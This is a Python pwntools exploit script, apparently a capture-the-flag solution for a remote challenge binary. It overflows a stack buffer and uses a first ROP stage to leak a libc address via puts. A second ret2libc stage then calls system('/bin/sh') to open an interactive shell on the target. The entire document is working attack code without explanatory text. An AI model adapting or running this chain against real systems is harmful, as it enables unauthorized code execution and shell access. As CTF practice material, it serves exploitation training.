from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT = 32800
   libc = ELF('libc.so.6')
else:
   libc = e.libc

gs = '''
continue
'''

gadget = 0x4011c1
'''
004011c1  4889c7             mov     rdi, rax {str}
004011c4  e887feffff         call    puts
004011c9  b800000000         mov     eax, 0x0
004011ce  e883ffffff         call    vuln
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)

p = start()

p.recvuntil(b'Give me some input please!')
chain = cyclic(112)
chain += p64(e.got['gets'])
chain += p64(0x4011c1)

log.info(f"Sending First Stage")
p.sendline(chain)
p.recvline()
full = p.recvline()
leak = u64(full[16:24])
log.info(f"Leak:  {hex(leak)}")
libc.address=leak-libc.sym['_IO_2_1_stdout_']
log.info(f"Libc: {hex(libc.address)}")

log.info("Calculating Libc Gadgets")
rl = ROP(libc)
ret = p64(rl.find_gadget(['ret'])[0])
pop_rdi = p64(rl.find_gadget(['pop rdi','ret'])[0])
bin_sh = p64(next(libc.search(b'/bin/sh\0')))

log.info("Pausing before second stage")
pause(1)

log.info("Sending second stage")
chain = cyclic(112)
chain += p64(e.got['gets'])
chain += ret
chain += pop_rdi
chain += bin_sh
chain += p64(libc.sym.system)

p.sendline(chain)

p.interactive()
